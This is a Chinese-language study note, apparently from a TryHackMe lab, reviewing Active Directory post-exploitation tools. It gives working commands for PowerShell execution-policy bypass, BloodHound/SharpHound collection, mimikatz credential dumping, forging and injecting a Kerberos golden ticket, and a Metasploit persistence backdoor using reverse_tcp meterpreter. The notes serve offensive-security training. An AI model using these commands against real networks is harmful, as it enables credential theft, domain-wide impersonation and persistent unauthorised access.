# post exploit

这些东西我们在学习AD的时候就已经使用过了，今天借此房间我们来简单复习一下

### Powerview

启动 Powershell - -ep 绕过 Powershell 的执行策略，让您轻松运行脚本

    powershell -ep bypass

这里有一个备忘单来帮助你使用命令：https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

---

### BloodHound

寻血猎犬装置 -

1.)apt-get install bloodhound    

2.） - 默认凭据 -> neo4j：neo4jneo4j console

用神猎犬获得战利品 -

1.） 与 PowerView 相同powershell -ep bypass

2.). .\Downloads\SharpHound.ps1    

3.)Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip

将zip文件拖到bloodhound上

---

### mimikatz

Mimikatz是一种非常流行且功能强大的后开发工具，主要用于在Active Directory网络内转储用户凭据

确保输出为“privilege '20' OK” - 这可确保您以管理员身份运行 mimikatz;如果您不以管理员身份运行Mimikatz，Mimikatz将无法正常运行 privilege::debug

后面的内容都是很熟悉了，提取ntlm hash....john爆破....

### Golden Ticket && mimikatz

再次使用与上一个任务相同的工具;但是，这次我们将使用它来创建一张黄金票。

我们将首先转储 krbtgt 用户的哈希和 sid，然后创建一个黄金票证，并使用该黄金票证打开一个新的命令提示符，允许我们访问网络上的任何机器。

    mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt

参数说明：

    /admin - 我们要模拟的用户名。这不必是有效的用户。
    /domain - 我们要为其生成票证的域的 FQDN。
    /id - 用户 RID。默认情况下，Mimikatz 使用 RID 500，这是默认的管理员帐户 RID。
    /sid - 我们要为其生成票证的域的 SID。
    /krbtgt - KRBTGT 帐户的 NTLM 哈希。
    /endin - 票证生存期。默认情况下，Mimikatz 会生成有效期为 10 年的票证。AD 的默认 Kerberos 策略为 10 小时（600 分钟）
    /renewmax - 续订的最长票证生存期。默认情况下，Mimikatz 会生成有效期为 10 年的票证。AD 的默认 Kerberos 策略为 7 天（10080 分钟）
    /ptt - 此标志告诉 Mimikatz 将票证直接注入会话，这意味着它已准备好使用。

misc::cmd打开新的cmd

klist查看有没有注入成功

---

### mmc

差不多就是mmc的使用，没什么好讲的点

---

### Metasploit 持久性

运行持久性模块 -

1.） 默认情况下，此模块将每 10 秒发送一次有效负载，但您可以将此时间设置为您想要的任何时间

    use exploit/windows/local/persistence

如果系统因任何原因关闭或重置，您将丢失您的 meterpreter 会话，但是通过使用持久性模块，您可以在系统中创建一个后门，您可以随时使用 metasploit multi 处理程序访问该后门，并将有效负载设置为允许您将另一个 meterpreter 有效负载发送到机器并打开新的 meterpreter 会话。windows/meterpreter/reverse_tcp
